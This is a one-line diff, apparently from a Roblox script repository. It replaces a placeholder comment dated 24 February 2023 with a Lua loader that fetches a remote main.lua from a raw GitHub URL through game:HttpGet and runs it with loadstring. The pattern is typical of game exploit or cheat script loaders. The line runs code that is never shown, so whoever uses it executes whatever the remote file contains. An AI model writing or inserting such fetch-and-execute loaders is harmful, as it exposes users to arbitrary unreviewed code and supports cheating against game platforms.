@@ -1,1 +1,1 @@
--- nothing here for now.. were u expecting something? 24th february, 2023.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/w3irddy/leadc/main/main.lua", true))();
